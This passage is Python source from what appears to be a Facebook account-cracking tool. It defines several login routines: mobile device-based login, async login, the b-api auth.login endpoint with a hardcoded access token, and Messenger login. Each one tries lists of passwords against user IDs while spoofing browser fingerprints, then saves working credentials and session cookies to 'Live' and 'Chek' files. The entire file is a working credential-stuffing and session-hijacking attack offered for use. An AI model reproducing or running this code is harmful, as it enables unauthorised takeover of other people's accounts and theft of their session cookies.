			   "referrer": f"https://m.prod.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
			   "user-agent":ua}
			post = ses.post("https://m.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=hd, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{P}  - {H}{uid}|{pw} ---> OK{P}")
				print(f"\r{P}  - {H}{kuki}{P}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f"\r{P}  - {K}{uid}|{pw} ---> CP{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
###-----[ METODE ASYNC ]-----###
def _async_(uid,pasw):
	global loop,ok,cp
	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pasw:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = ugen()
			versi = re.search('Chrome/(\d+).', str(ua)).group(1)
			versi2 = f".0.{str(rr(1111,5999))}.{str(rr(45,150))}"
			link = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			data = {"m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),"li": re.search('name="li" value="(.*?)"',str(link.text)).group(1),"try_number": re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),"email": uid,"prefill_contact_point": uid,"prefill_source": "browser_dropdown","prefill_type": "password","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": "true","had_password_prefilled": "true","is_smart_lock": "false","bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),"bi_wvdp": str('{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}'),"pass": pw,"fb_dtsg":"","jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)}
			hd2 = {"Host": "m.facebook.com","content-length": "2138","sec-ch-ua": '"Not/A)Brand";v="99", "Samsung Internet";v="23.0", "Chromium";v="%s"'%(versi),"sec-ch-ua-mobile": "?1","user-agent": ua,"viewport-width": "421","content-type": "application/x-www-form-urlencoded","x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"sec-ch-ua-platform-version": '"10.0.0"',"x-asbd-id": "129477","dpr": "2.56875","sec-ch-ua-full-version-list": '"Not/A)Brand";v="99.0.0.0", "Samsung Internet";v="23.0.0.47", "Chromium";v="%s%s"'%(versi,versi2),"sec-ch-ua-model": '"Redmi Note 7"',"sec-ch-prefers-color-scheme": "light","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://m.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			ses.post("https://m.facebook.com/login/device-based/login/async/?api_key=190291501407&auth_token=563a4d0ad69493ce0947d19e95df8085&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&refsrc=deprecated&app_id=190291501407&cancel=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&lwv=100",data=data, headers=hd2, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{P}  - {H}{uid}|{pw} ---> OK{P}")
				print(f"\r{P}  - {H}{kuki};{ua}{P}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}|{ua}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f"\r{P}  - {K}{uid}|{pw} ---> CP{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
###-----[ METODE API ]-----###
def _api_(uid,pasw):
	global loop,ok,cp,a2f
	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P} A2F-:{M}{a2f}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pasw:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = api()
			headers_ = {"x-fb-connection-bandwidth": str(rr(20000000.0, 30000000.0)), "x-fb-sim-hni": str(rr(20000, 40000)), "x-fb-net-hni": str(rr(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': str(rr(2,31)), 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
			response = ses.get('https://b-api.facebook.com/method/auth.login', params=params, headers=headers_)
			xxx = json.loads(response.text)
			if 'access_token' in response.text and 'EAAA' in response.text:
				ok+=1
				coki = xxx["session_cookies"]
				cok = {}
				for x in coki:
					cok.update({x["name"]:x["value"]})
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
				print(f"\r{P}  - {H}{uid}|{pw} ---> OK{P}")
				print(f"\r{P}  - {H}{kuki}{P}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif 'checkpoint' in response.text:
				cp+=1
				print(f"\r{P}  - {K}{uid}|{pw} ---> CP{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			elif 'Login approvals' in response.json()['error_msg']:
				a2f+=1
				print(f"\r{P}  - {M}{uid}|{pw} ---> A2F{P}")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
###-----[ METODE MESSENGER ]-----###
def _messenger_(uid,pasw):
	global loop,ok,cp
	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	while True:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
			headers = {
             "Host": "www.messenger.com",
             "Connection": "keep-alive",
             "Content-Length": "267",
             "Cache-Control": "max-age=0",
             "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
             "sec-ch-ua-mobile": "?0",
             "sec-ch-ua-platform": '"Linux"',
             "Upgrade-Insecure-Requests": "1",
             "Origin": "https://www.messenger.com",
             "Content-Type": "application/x-www-form-urlencoded",
             "User-Agent": ua,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "Sec-Fetch-Site": "same-origin",
             "Sec-Fetch-Mode": "navigate",
             "Sec-Fetch-User": "?1",
             "Sec-Fetch-Dest": "document",
             "Referer": "https://www.messenger.com/",
             "Accept-Encoding": "gzip, deflate, br",
             "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",
			}
			reqs = ses.get("https://www.messenger.com/").text
			datr = re.search('_js_datr","(.*?)",', str(reqs)).group(1)
			data = {
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(reqs)).group(1),
             "lsd":re.search('name="lsd" value="(.*?)"', str(reqs)).group(1),
             "initial_request_id":re.search('name="initial_request_id" value="(.*?)"', str(reqs)).group(1),
             "timezone":"-420",
             "lgndim":re.search('name="lgndim" value="(.*?)"', str(reqs)).group(1),
             "lgnrnd":re.search('name="lgnrnd" value="(.*?)"', str(reqs)).group(1),
             "lgnjs":"n",
             "email":uid,
             "pass":"Sungkem Puh Sepuhh",
             "login":"1",
             "persistent":"1",
             "default_persistent":""
			}
			headers.update({"Cookie":f"wd=980x1715; dpr=2; _js_datr={datr}"})
			break
		except:pass
	for pw in pasw:
		try:
			data.update({"pass":"".join(pw)})
			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				kuki = (';').join(["%s=%s"%(name,value) for name,value in ses.cookies.get_dict().items()]) + headers.get('Cookie').replace(' ','')
				print(f"\r{P}  - {H}{uid}|{pw} ---> OK{P}")
				print(f"\r{P}  - {H}{kuki}{P}")
				ok +=1
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif "www.facebook.com%2Fcheckpoint" in response.headers.get('Location'):
				print(f"\r{P}  - {K}{uid}|{pw} ---> CP{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				cp+=1
				break
			else:continue
		except (requests.exceptions.ConnectionError):
			time.sleep(15)
		except:pass
	loop+=1
        
if __name__=='__main__':
	try:os.mkdir('Live')
	except:pass
	try:os.mkdir('Chek')
	except:pass
	menu()